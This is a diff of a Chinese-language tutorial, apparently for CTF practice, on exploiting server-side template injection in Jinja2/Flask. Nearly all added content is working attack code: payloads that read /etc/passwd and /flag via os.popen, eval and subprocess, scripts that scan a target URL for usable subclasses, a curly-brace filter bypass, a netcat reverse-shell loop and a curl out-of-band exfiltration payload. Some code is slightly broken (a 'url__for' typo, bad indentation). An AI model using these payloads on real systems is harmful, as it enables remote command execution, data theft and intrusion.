@@ -120,7 +120,7 @@ popen()：执行一个shell以运行命令来开启一个进程
 
 ## 文件读取
 
-### _frozen_importlib_external.FileLoader
+### 1._frozen_importlib_external.FileLoader
 
 文件读取类名：_frozen_importlib_external.FileLoader
 
@@ -144,9 +144,10 @@ for i in range(500):
 
 找到_frozen_importlib_external.FileLoader类名的位置
 
-{{""\.\_\_class__\.\_\_base\_\_\.\_\_subclasses\_\_[<font color=red>79</font>]\["get_data"](0,"/etc/passwd")}}
+```php
+{{"".__class__.__base__.__subclasses__[<font color=red>79</font>]\["get_data"](0,"/etc/passwd")}}
 
-### eval
+```
 
 查找eval脚本
 
@@ -163,8 +164,174 @@ for i in range(500):
                 print(i)
     except:
         pass
+```
+
+```php
+{{"".__class__.__base__.__subclasses__()[473].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()')}}
+```
+
+
+
+### 3.os
+
+通过config，调用os
+
+```php
+{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
+```
+
+通过url_for,调用os
+
+```php
+{{url__for.__globals__.os.popen('cat /flag').read()}}
+```
+
+在已经加载os模块的子类中直接调用os模块
+
+```php
+{{"".__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen('cat /flag').read()}}
+```
+
+查找os模块脚本
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__}}"}
+    try:
+        response = requests.post(url,data=data)
+        #print(response)
+        if(response.status_code==200):
+            if'os.py' in str(response.content):
+                print(i)
+    except:
+        pass
+```
+
+可以加载第三方库，使用load_module加载os
+
+_frozen_importlib.BuiltinImporter查找脚本
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
+    try:
+        response = requests.post(url,data=data)
+        #print(response)
+        if(response.status_code==200):
+            if'_frozen_importlib.BuiltinImporter' in str(response.content):
+                print(i)
+    except:
+        pass
 
 
 
 ```
 
+```php
+{{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("cat /flag").read()}}
+```
+
+subprocess.Popen模块
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
+    try:
+        response = requests.post(url,data=data)
+        #print(response)
+        if(response.status_code==200):
+            if'subprocess.Popen' in str(response.content):
+                print(i)
+    except:
+        pass
+
+
+```
+
+```php
+{{[].__class__.__base__.__subclasses__()[200]('ls/',shell=True,stdout=-1).communicate()[0].strip()}}
+```
+
+# 5.大括号过滤
+
+{{}}被过略
+
+尝试{%%}
+
+判断语句是否能正确执行
+
+```php
+{% if 2>1 %}benben{%endif%}
+```
+
+```php
+{%if "".__class__%}benben{%endif%}
+```
+
+有回显说明<font color=red>**"".\_\_class\_\_**</font>有内容
+
+```php
+{% if "".__class__.__base__.__subclasses__()[117].__init__.__globals__["popen"]("cat /etc/passwd").read() %}benben{% endif %}
+```
+
+查询脚本
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    data={"code":'{% if "".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("cat /etc/passwd").read() %}benben{% endif %}'}
+    try:
+        response = requests.post(url,data=data)
+        #print(response)
+        if(response.status_code==200):
+            if 'benben' in str(response.content):
+                print(i)
+    except:
+        pass
+
+```
+
+# 6.无回显SSTI
+
+## 1.反弹shell
+
+192.168.204.149 监听7777端口
+
+nc -lvp 7777
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+     try:
+    data={"name":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('netcat 192.168.1.161 7777 -e /bin/bash').read()}}"}
+        response = requests.post(url,data=data)
+    except:
+        pass
+```
+
+## 2.带外注入
+
+kali开启python监听
+
+python3 -m http.server 80
+
+```python
+import requests
+url=input('请输入URL:')
+for i in range(500):
+    try:
+        data={"code":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['popen']('curl http://192.168.204.149/`cat /flag`').read()}}"}
+        response = requests.post(url,data=data)
+    except:
+        pass
+```
+
+# 7.绕过中括号过滤
